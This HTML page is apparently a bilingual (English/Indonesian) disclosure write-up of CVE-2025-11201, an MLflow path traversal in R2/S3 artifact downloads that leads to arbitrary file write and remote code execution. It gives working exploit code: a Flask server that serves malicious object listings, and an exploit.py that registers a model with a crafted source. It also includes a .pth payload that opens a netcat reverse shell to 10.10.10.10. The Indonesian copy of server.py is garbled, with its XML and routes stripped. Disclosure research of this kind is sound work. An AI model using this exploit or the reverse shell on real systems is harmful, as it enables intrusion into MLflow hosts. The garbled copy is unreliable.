<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>CVE-2025-11201 Arbitrary File Write → RCE (MLflow)</title>
  <meta name="author" content="Muhammad Fadilullah Dzaki @0xboyz" />
  <link rel="icon" type="image/png" href="favicon.png" />
  <style>
    /* Dark hacker style */
    :root{
      --bg: #0b0f12;
      --panel: #071018;
      --muted: #84a0a8;
      --text: #cfe8e8;
      --accent: #ffffff; /* hijau -> putih */
      --accent-2: #7adfff;
      --danger: #ff6b6b;
      --mono: "Fira Code", "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
      --glass: rgba(255,255,255,0.02);
      --glass-border: rgba(255,255,255,0.04);
    }

    html,body{height:100%;margin:0;background:linear-gradient(180deg,#050607 0%, #081215 100%);color:var(--text);font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;}
    header{position:fixed;left:0;right:0;top:0;display:flex;align-items:center;justify-between:space-between;padding:14px 22px;backdrop-filter: blur(6px);z-index:1000}
    .topbar {width:100%;display:flex;align-items:center;justify-content:space-between;gap:12px}
    .brand {font-family:var(--mono);color:var(--accent);font-weight:700;letter-spacing:1px}
    .navlinks {display:flex;gap:10px}
    .navlinks a{color:var(--muted);text-decoration:none;padding:8px 12px;border-radius:8px;border:1px solid var(--glass-border);background:var(--glass);font-size:0.95rem;position:relative;overflow:hidden}
    .navlinks a:hover{color:var(--accent-2);transform:translateY(-2px)}
    /* Home button bird animation (subtle) */
    .navlinks a.home::before{
      content: "";
      position: absolute;
      left: -28px;
      top: 50%;
      transform: translateY(-50%) scale(0.9);
      font-size:18px;
      opacity: 0.8;
      filter: drop-shadow(0 2px 2px rgba(0,0,0,0.6));
      animation: fly-across 3.2s linear infinite;
      pointer-events: none;
    }
    @keyframes fly-across{
      0%   { left: -28px; transform: translateY(-18%) rotate(-20deg) scale(0.9); opacity:0; }
      8%   { left: 6%;   transform: translateY(-28%) rotate(-6deg) scale(1); opacity:1; }
      40%  { left: 42%;  transform: translateY(-50%) rotate(6deg)  scale(1); opacity:0.95; }
      75%  { left: 86%;  transform: translateY(-42%) rotate(10deg) scale(0.95); opacity:0.6; }
      100% { left: 110%; transform: translateY(-50%) rotate(20deg) scale(0.9); opacity:0; }
    }

    main{max-width:980px;margin:110px auto 80px;padding:0 20px}
    .post{background:linear-gradient(180deg, rgba(10,14,16,0.7), rgba(6,10,12,0.8)); border:1px solid rgba(255,255,255,0.03); border-radius:12px; padding:28px; box-shadow: 0 10px 40px rgba(3,8,12,0.8)}
    h1{margin:0 0 8px 0;font-size:1.6rem;color:var(--accent)}
    .meta{color:var(--muted);margin:8px 0 14px 0}
    .byline{color:var(--muted);margin-bottom:12px}
    .timeline{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0 16px}
    .timeline .item{background:transparent;padding:8px 10px;border-radius:8px;border:1px dashed rgba(255,255,255,0.06);color:var(--muted);font-size:0.92rem}
    h2{color:var(--accent-2);margin:18px 0 8px 0;font-size:1.05rem}
    p, li{color:var(--text);font-size:1rem;line-height:1.7;margin:0 0 12px 0}
    ul, ol{margin-left:20px}
    a.ref{color:var(--accent);text-decoration:none}
    a.ref:hover{text-decoration:underline}
    pre.code{background:#021014;color:#dff;padding:14px;border-radius:8px;overflow:auto;border:1px solid rgba(255,255,255,0.06);font-family:var(--mono);font-size:0.92rem;line-height:1.45}
    .code .keyword { color: #7adfff; font-weight:700; }
    .note{color:#9ad3d3;font-size:0.95rem}
    .diagram{margin:18px 0;display:flex;justify-content:center}
    .refs{margin-top:18px;border-top:1px dashed rgba(255,255,255,0.03);padding-top:14px;color:var(--muted)}
    .back{display:inline-block;color:var(--muted);text-decoration:none;margin-bottom:12px;border-bottom:1px dashed rgba(122,223,255,0.06);padding-bottom:2px}
    .lang-toggle{position:fixed;bottom:20px;left:20px;z-index:1001;padding:9px 12px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--accent);font-family:var(--mono);cursor:pointer}
    footer{color:var(--muted);font-size:0.9rem;text-align:center;margin-top:18px}
    @media (max-width:740px){main{margin-top:100px}h1{font-size:1.35rem}pre.code{font-size:0.82rem}}
  </style>
</head>
<body>
  <header>
    <div class="topbar">
      <div class="brand">0xboyz</div>
      <nav class="navlinks" aria-label="top links">
        <!-- Home dan Blog diarahkan ke URL yang diberikan, Home diberi class 'home' untuk animasi burung -->
        <a class="home" href="https://funscoietyxboyz.github.io/0xboyz/" aria-label="Home">Home</a>
        <a href="https://funscoietyxboyz.github.io/0xboyz/Blog" aria-label="Blog">Blog</a>
        <a href="https://github.com/funscoietyxboyz/" target="_blank" rel="noopener">GitHub</a>
      </nav>
    </div>
  </header>

  <main>
    <!-- ENGLISH -->
    <article id="en" class="post" style="display:block" aria-labelledby="title-en">
            <h1 id="title-en">CVE-2025-11201 Arbitrary File Write → Remote Code Execution in MLflow</h1>
      <div class="meta">Written by Muhammad Fadilullah Dzaki (@0xboyz)</div>

<link rel="icon" type="image/png" href="favicon.png" />  

     
      <p class="note"><strong></p>

      <h2>Story</h2>
      <p>
        One afternoon, I was checking out MLflow's artifact implementation, just to see how they supported remote storage, when a small detail caught my eye: the way MLflow fetches artifacts from an S3-like endpoint is more flexible than is safe. That flexibility ultimately opens the door to one serious vector: sneaking files to arbitrary paths on the target host while MLflow is downloading artifacts. With a few strings attached, this can escalate into Remote Code Execution (RCE). Below, I recount the discovery, outlining the technical mechanism, why it's dangerous for the ML supply chain, and how it could be exploited.
      </p>
      <h2>A brief background on MLflow, artifacts, and boto3<h2>
      <p>
MLflow provides an artifact mechanism for storing models and related assets. When the artifact source points to an S3-like provider, MLflow uses a common Python client to read the object list and download the required objects. In many deployments, boto3 is already installed, sometimes by MLflow itself, sometimes due to other dependencies, and local AWS credentials often exist on the developer host or container.
      <p>

      <h2>Vulnerable functions root cause full code blocks</h2>
      <p>Below are the exact functions inspected as present before patch:</p>

      <pre class="code">
def parse_s3_compliant_uri(self, uri):
        # r2 uri format(virtual): r2://&lt;bucket-name&gt;@&lt;account-id&gt;.r2.cloudflarestorage.com/&lt;path&gt;
        parsed = urlparse(uri)
        if parsed.scheme != "r2":
            raise Exception(f"Not an R2 URI: {uri}")

        host = parsed.netloc
        path = parsed.path

        bucket = host.split("@")[0]
        if path.startswith("/"):
            path = path[1:]
        return bucket, path

    @staticmethod
    def convert_r2_uri_to_s3_endpoint_url(r2_uri):
        host = urlparse(r2_uri).netloc
        host_without_bucket = host.split("@")[-1]
        return f"https://{host_without_bucket}"
      </pre>

      <pre class="code">
def list_artifacts(self, path=None):
        artifact_path = self.bucket_path
        dest_path = self.bucket_path
        if path:
            dest_path = posixpath.join(dest_path, path)
        infos = []
        prefix = dest_path + "/" if dest_path else ""
        s3_client = self._get_s3_client()
        paginator = s3_client.get_paginator("list_objects_v2")
        results = paginator.paginate(Bucket=self.bucket, Prefix=prefix, Delimiter="/")
        for result in results:
            # Subdirectories will be listed as "common prefixes" due to the way we made the request
            for obj in result.get("CommonPrefixes", []):
                subdir_path = obj.get("Prefix")
                self._verify_listed_object_contains_artifact_path_prefix(
                    listed_object_path=subdir_path, artifact_path=artifact_path
                )
                subdir_rel_path = posixpath.relpath(path=subdir_path, start=artifact_path)
                if subdir_rel_path.endswith("/"):
                    subdir_rel_path = subdir_rel_path[:-1]
                infos.append(FileInfo(subdir_rel_path, True, None))
            # Objects listed directly will be files
            for obj in result.get("Contents", []):
                file_path = obj.get("Key")
                self._verify_listed_object_contains_artifact_path_prefix(
                    listed_object_path=file_path, artifact_path=artifact_path
                )
                file_rel_path = posixpath.relpath(path=file_path, start=artifact_path)
                file_size = int(obj.get("Size"))
                infos.append(FileInfo(file_rel_path, False, file_size))
        return sorted(infos, key=lambda f: f.path)
      </pre>

<h2>Root cause analysis</h2>
      <p>
        Two related weaknesses combine to create the issue:
      </p>
      <ul>
        <li>URI parsing & endpoint trust R2 URIs were converted to HTTPS endpoints without strict hostname validation, enabling attacker-controlled endpoints to serve malicious listings.</li>
        <li>Path handling logic remote Keys were validated with a string prefix check and passed into <code>posixpath.relpath()</code>, but the code never confirmed the resulting path stays within the artifact root.</li>
      </ul>

      <h2>Why this is exploitable</h2>
      <p>
        <code>posixpath.relpath()</code> alone is not a security boundary it returns a textual relative path. If an attacker supplies a Key with many <code>../</code> segments, the resulting relative path, when joined to a local artifact root and written without canonicalization (os.path.realpath), can land outside the intended directory. A simple string-based prefix check can be bypassed by inserting traversal sequences that still pass naive prefix tests.
      </p>

     <h2>The core of the vulnerability</h2>
     </p>
MLflow processes the list of artifact listings and paths returned by the S3-like endpoint without ensuring that the object name key does not contain a path traversal segment (../..), which could cause the target path in the filesystem to be outside the allowed artifact directory. If an attacker controls the S3-like host, they can direct MLflow to download an object and write it to arbitrary locations on the host, including sensitive locations, which could escalate to RCE.
     </p>

      <h2>Exploitation</h2>
       <p> Server.py <p>
      <pre class="code">  
from flask import Flask, request

# Configure payload file
file_path = '../../../../../../../../../../tmp/this_is_payload'
file_contents = 'You have been Hacked'

# For RCE testing, enable the following lines:
#file_path = '../../../../../../../../usr/local/lib/python3.10/site-packages/random.pth'
#file_contents = (
# "import os; os.system('rm /tmp/f;mkfifo /tmp/f;"
# "cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f');"
# )

app = Flask(__name__)

@app.route("/<domain>")
def s3_handler(domain):
    if 'location' in request.args:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<LocationConstraint xmlns="http://s3.amazonaws.com/doc/2006-03-01/">'
            'region-code</LocationConstraint>'
        )

    if 'list-type' in request.args:
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            '<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">\n'
            '    <Name>unused</Name>\n'
            '    <Prefix>unused</Prefix>\n'
            '    <KeyCount>1</KeyCount>\n'
            '    <MaxKeys>1000</MaxKeys>\n'
            '    <Delimiter>/</Delimiter>\n'
            '    <IsTruncated>false</IsTruncated>\n'
            '    <EncodingType>url</EncodingType>\n'
            '    <Contents>\n'
            f'        <Key>a/b/c/d/e/f/g/{file_path}</Key>\n'
            '        <LastModified>2024-02-13T16:34:20.000Z</LastModified>\n'
            '        <ETag>"d41d8cd98f00b204e9800998ecf8427e"</ETag>\n'
            '        <Size>123</Size>\n'
            '        <StorageClass>STANDARD</StorageClass>\n'
            '    </Contents>\n'
            '</ListBucketResult>'
        )

    return 'fallback'

@app.route("/<domain>/<path:filepath>")
def file_response(domain, filepath):
    return file_contents

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4444)
    </pre>

 <p>exploit.py<p> 
<pre class="code">

import requests

class MLFlowExploit:
    """Proof-of-Concept for model artifact abuse via crafted source path.
    PoC eksploitasi artefak model dengan path sumber yang dimanipulasi.
    """

    def __init__(self, target_url, attacker_host, model_id):
        self.api = target_url
        self.attacker = attacker_host
        self.model = model_id
        self.session = requests.Session()

    def register_model(self):
        """Step 1: Register a new model / Daftarkan model baru"""
        endpoint = f"{self.api}/ajax-api/2.0/mlflow/registered-models/create"
        payload = {"name": self.model}
        response = self.session.post(endpoint, json=payload)
        print("Model Registration →", response.status_code, response.content)
        return response

    def create_version(self):
        """Step 2: Create model version with crafted source / Buat versi model dengan sumber yang dimodifikasi"""
        endpoint = f"{self.api}/ajax-api/2.0/mlflow/model-versions/create"
        crafted_source = f"r2://{self.attacker}/a/b/c/d/e/f/"
        payload = {
            "name": self.model,
            "source": crafted_source
        }
        response = self.session.post(endpoint, json=payload)
        print("Version Creation →", response.status_code, response.content)
        return response

    def fetch_artifact(self, version):
        """Step 3: Retrieve artifact from created version / Ambil artefak dari versi yang dibuat"""
        endpoint = f"{self.api}/model-versions/get-artifact"
        params = {
            "path": "g",
            "name": self.model,
            "version": version
        }
        response = self.session.get(endpoint, params=params)
        print("Artifact Retrieval →", response.status_code, response.content)
        return response

# === Execution / Eksekusi ===
if __name__ == "__main__":
    exploit = MLFlowExploit(
        target_url="http://127.0.0.1:4444",
        attacker_host="3422-[...].ngrok-free.app",
        model_id="exp"
    )

    exploit.register_model()
    version_response = exploit.create_version()
    version_id = version_response.json().get("model_version", {}).get("version")
    exploit.fetch_artifact(version_id)
   </pre>
 
       <h2>Exploit Concept<h2>
       <ol>
        <li>Attacker controls or spoofs an R2/S3 endpoint.</li>
        <li>The endpoint returns a listing containing Keys with traversal segments (e.g. <code>a/b/../../../../tmp/pwned</code>).</li>
        <li>MLflow processes the listing, computes a relpath, and performs a write to the resolved path which outside the artifact root.</li>
        <li>Attacker arranges the write to target an execution surface (Python <code>.pth</code>, plugin dir, rc files) to achieve RCE.</li>
      </ol>

      <h2>Impact</h2>
      <ul>
        <li>Severity: High CVSS 8.1</li>
        <li>Vector: Network</li>
        <li>Privileges: None required on target host to trigger write </li>
        <li>Impact: Arbitrary file writes to Remote Code Execution</li>
      </ul>

      <h2>References</h2>
      <div class="refs">
        <ul>
          <li><a class="ref" href="https://github.com/mlflow/mlflow/blob/4a56e50ece52b33e1cec4fed0b37a0465f8a1eda/mlflow/store/artifact/optimized_s3_artifact_repo.py#L272-L302" target="_blank" rel="noopener">Source optimized_s3_artifact_repo.py lines 272–302 (GitHub)</a></li>
          <li> <a class="ref" href="https://www.zerodayinitiative.com/advisories/ZDI-25-931/" target="_blank" rel="noopener">Advisory / tracking: CVE-2025-11201 ZDI-25-931 (Zero Day Initiative)</a></li>
        </ul>
      </div>

      <footer>
        © 2025 Muhammad Fadilullah Dzaki (@0xboyz) Responsible disclosure & security research
      </footer>
    </article>

    <!-- INDONESIAN -->
    <article id="id" class="post" style="display:none" aria-labelledby="title-id">
      <h1 id="title-id">CVE-2025-11201 Arbitrary File Write → Remote Code Execution pada MLflow</h1>
      <div class="meta">Ditulis oleh Muhammad Fadilullah Dzaki (@0xboyz)</div>
  
      <p class="note"><strong></p>

      <h2>Cerita</h2>
      <p>
        Suatu sore saya sedang mengecek implementasi artefak di MLflow hanya ingin melihat bagaimana mereka mendukung storage “remote” ketika sebuah detail kecil menarik perhatian saya, cara MLflow mem-fetch artefak dari endpoint S3-like ternyata lebih fleksibel daripada yang aman. Fleksibilitas itu pada akhirnya membuka pintu untuk satu vektor serius, menyusupkan file ke path arbitrary di host target saat MLflow mengunduh artefak. Dengan sedikit rangkaian kondisi, hal ini dapat bereskalasi menjadi Remote Code Execution (RCE).

Di bawah ini saya ceritakan perjalanan temuan itu, menguraikan mekanisme teknis, mengapa itu berbahaya untuk supply chain ML, dan Bagaimana ini bisa di exploitasi.
      </p>
      <h2>Latar belakang singkat MLflow, artefak, dan boto3<h2>
      <p>
MLflow menyediakan mekanisme artefak untuk menyimpan model dan aset terkait. Ketika sumber artefak menunjuk ke penyedia S3-like, MLflow menggunakan klien Python umum untuk membaca daftar objek dan mengunduh objek yang diperlukan. Dalam banyak deployment, boto3 sudah terpasang kadang karena MLflow sendiri, kadang karena dependency lain dan kredensial AWS lokal sering ada di host developer atau container.
       <p>
      <h2>Fungsi rentan akar masalah blok kode lengkap</h2>
      <p>Berikut fungsi yang saya inspeksi sebelum patch:</p>
      <pre class="code">
def parse_s3_compliant_uri(self, uri):
        # r2 uri format(virtual): r2://&lt;bucket-name&gt;@&lt;account-id&gt;.r2.cloudflarestorage.com/&lt;path&gt;
        parsed = urlparse(uri)
        if parsed.scheme != "r2":
            raise Exception(f"Not an R2 URI: {uri}")

        host = parsed.netloc
        path = parsed.path

        bucket = host.split("@")[0]
        if path.startswith("/"):
            path = path[1:]
        return bucket, path

    @staticmethod
    def convert_r2_uri_to_s3_endpoint_url(r2_uri):
        host = urlparse(r2_uri).netloc
        host_without_bucket = host.split("@")[-1]
        return f"https://{host_without_bucket}"
      </pre>

      <pre class="code">
def list_artifacts(self, path=None):
        artifact_path = self.bucket_path
        dest_path = self.bucket_path
        if path:
            dest_path = posixpath.join(dest_path, path)
        infos = []
        prefix = dest_path + "/" if dest_path else ""
        s3_client = self._get_s3_client()
        paginator = s3_client.get_paginator("list_objects_v2")
        results = paginator.paginate(Bucket=self.bucket, Prefix=prefix, Delimiter="/")
        for result in results:
            # Subdirectories will be listed as "common prefixes" due to the way we made the request
            for obj in result.get("CommonPrefixes", []):
                subdir_path = obj.get("Prefix")
                self._verify_listed_object_contains_artifact_path_prefix(
                    listed_object_path=subdir_path, artifact_path=artifact_path
                )
                subdir_rel_path = posixpath.relpath(path=subdir_path, start=artifact_path)
                if subdir_rel_path.endswith("/"):
                    subdir_rel_path = subdir_rel_path[:-1]
                infos.append(FileInfo(subdir_rel_path, True, None))
            # Objects listed directly will be files
            for obj in result.get("Contents", []):
                file_path = obj.get("Key")
                self._verify_listed_object_contains_artifact_path_prefix(
                    listed_object_path=file_path, artifact_path=artifact_path
                )
                file_rel_path = posixpath.relpath(path=file_path, start=artifact_path)
                file_size = int(obj.get("Size"))
                infos.append(FileInfo(file_rel_path, False, file_size))
        return sorted(infos, key=lambda f: f.path)
      </pre>
<h2>Analisis akar masalah</h2>
      <p>
        Dua kelemahan saling terkait menghasilkan masalah ini:
      </p>
      <ul>
        <li>Parsing URI & kepercayaan endpoint URI R2 dikonversi menjadi endpoint HTTPS tanpa validasi hostname ketat, memungkinkan endpoint yang dikontrol penyerang mengirim listing berbahaya.</li>
        <li>Logika penanganan path Key remote divalidasi dengan pengecekan prefix string lalu diproses dengan <code>posixpath.relpath()</code>, namun tidak ada konfirmasi bahwa path hasil tetap berada di dalam root artefak.</li>
      </ul>

      <h2>Mengapa ini dapat dieksploitasi?</h2>
      <p>
        <code>posixpath.relpath()</code> bukan batas keamanan ia hanya memberikan path relatif tekstual. Bila penyerang menyisipkan banyak <code>../</code> pada Key, path relatif yang dihasilkan saat digabungkan dengan root lokal dan ditulis tanpa canonicalization (os.path.realpath) bisa berada di luar direktori yang dimaksud. Validasi prefix berbasis string dapat dilewati dengan menyisipkan traversal yang tetap lolos pengecekan.
      </p>
       <h2>Inti kerentanan</h2>
       </p>
MLflow memproses daftar objek listing & path artefak yang dikembalikan oleh endpoint S3-like tanpa memastikan bahwa Key nama objek tidak berisi segmen path traversal (../..) yang dapat membuat path target di filesystem keluar dari direktori artefak yang diizinkan. Bila attacker mengontrol host S3-like mereka dapat mengarahkan MLflow untuk mengunduh sebuah objek dan menuliskannya ke lokasi arbitrary di host termasuk lokasi sensitif yang memungkinkan eskalasi ke RCE.
      </p>
      <h2>Eksploitasi</h2>
      <p>server.py<p>
<pre class="code">  
from flask import Flask, request

# Configure payload file
file_path = '../../../../../../../../../../tmp/this_is_payload'
file_contents = 'You have been Hacked'

# For RCE testing, enable the following lines:
#file_path = '../../../../../../../../usr/local/lib/python3.10/site-packages/random.pth'
#file_contents = (
# "import os; os.system('rm /tmp/f;mkfifo /tmp/f;"
# "cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f');"
# )

app = Flask(__name__)

@app.route("/")
def s3_handler(domain):
    if 'location' in request.args:
        return (
            '\n'
            ''
            'region-code'
        )

    if 'list-type' in request.args:
        return (
            f'\n'
            '\n'
            '    unused\n'
            '    unused\n'
            '    1\n'
            '    1000\n'
            '    /\n'
            '    false\n'
            '    url\n'
            '    \n'
            f'        a/b/c/d/e/f/g/{file_path}\n'
            '        2024-02-13T16:34:20.000Z\n'
            '        "d41d8cd98f00b204e9800998ecf8427e"\n'
            '        123\n'
            '        STANDARD\n'
            '    \n'
            ''
        )

    return 'fallback'

@app.route("//")
def file_response(domain, filepath):
    return file_contents

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4444)
</pre>
<p>exploit.py<p> 
<pre class="code">

import requests

class MLFlowExploit:
    """Proof-of-Concept for model artifact abuse via crafted source path.
    PoC eksploitasi artefak model dengan path sumber yang dimanipulasi.
    """

    def __init__(self, target_url, attacker_host, model_id):
        self.api = target_url
        self.attacker = attacker_host
        self.model = model_id
        self.session = requests.Session()

    def register_model(self):
        """Step 1: Register a new model / Daftarkan model baru"""
        endpoint = f"{self.api}/ajax-api/2.0/mlflow/registered-models/create"
        payload = {"name": self.model}
        response = self.session.post(endpoint, json=payload)
        print("Model Registration →", response.status_code, response.content)
        return response

    def create_version(self):
        """Step 2: Create model version with crafted source / Buat versi model dengan sumber yang dimodifikasi"""
        endpoint = f"{self.api}/ajax-api/2.0/mlflow/model-versions/create"
        crafted_source = f"r2://{self.attacker}/a/b/c/d/e/f/"
        payload = {
            "name": self.model,
            "source": crafted_source
        }
        response = self.session.post(endpoint, json=payload)
        print("Version Creation →", response.status_code, response.content)
        return response

    def fetch_artifact(self, version):
        """Step 3: Retrieve artifact from created version / Ambil artefak dari versi yang dibuat"""
        endpoint = f"{self.api}/model-versions/get-artifact"
        params = {
            "path": "g",
            "name": self.model,
            "version": version
        }
        response = self.session.get(endpoint, params=params)
        print("Artifact Retrieval →", response.status_code, response.content)
        return response

# === Execution / Eksekusi ===
if __name__ == "__main__":
    exploit = MLFlowExploit(
        target_url="http://127.0.0.1:4444",
        attacker_host="3241-[...].ngrok-free.app",
        model_id="exp"
    )

    exploit.register_model()
    version_response = exploit.create_version()
    version_id = version_response.json().get("model_version", {}).get("version")
    exploit.fetch_artifact(version_id)
   </pre>
 
      <h2>Konsep Eksploitasi<h2>
      <ol>
        <li>Penyerang mengendalikan atau memalsukan endpoint R2/S3.</li>
        <li>Endpoint tersebut mengembalikan listing dengan Key yang berisi traversal (mis. <code>a/b/../../../../tmp/malicious</code>).</li>
        <li>MLflow memproses listing, menghitung relpath, dan melakukan write ke path yang ter-resolve yang berada di luar root artefak.</li>
        <li>Penyerang menargetkan lokasi eksekusi (mis. <code>.pth</code>, bashrc) untuk mendapatkan RCE.</li>
      </ol>

      <h2>Dampak</h2>
      <ul>
        <li>Severity: Tinggi CVSS 8.1</li>
        <li>Vektor: Jaringan</li>
        <li>Privileges: Tidak diperlukan pada host target untuk memicu penulisan </li>
        <li>Dampak: Arbitrary file write → Remote Code Execution</li>
      </ul>

      <h2>Referensi</h2>
      <div class="refs">
        <ul>
          <li><a class="ref" href="https://github.com/mlflow/mlflow/blob/4a56e50ece52b33e1cec4fed0b37a0465f8a1eda/mlflow/store/artifact/optimized_s3_artifact_repo.py#L272-L302" target="_blank" rel="noopener">Source optimized_s3_artifact_repo.py lines 272–302 (GitHub)</a></li>
          <li> <a class="ref" href="https://www.zerodayinitiative.com/advisories/ZDI-25-931/" target="_blank" rel="noopener">Advisory / tracking: CVE-2025-11201 ZDI-25-931 (Zero Day Initiative)</a></li>
        </ul>
      </div>

      <footer>
        © 2025 Muhammad Fadilullah Dzaki (@0xboyz) Responsible disclosure & security research
      </footer>
    </article>
  </main>

  <button class="lang-toggle" onclick="toggleLang()">EN / ID</button>

  <script>
    function toggleLang(){
      const en = document.getElementById('en');
      const id = document.getElementById('id');
      if (en.style.display === 'none') {
        en.style.display = 'block';
        id.style.display = 'none';
      } else {
        en.style.display = 'none';
        id.style.display = 'block';
      }
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  </script>
</body>
</html>
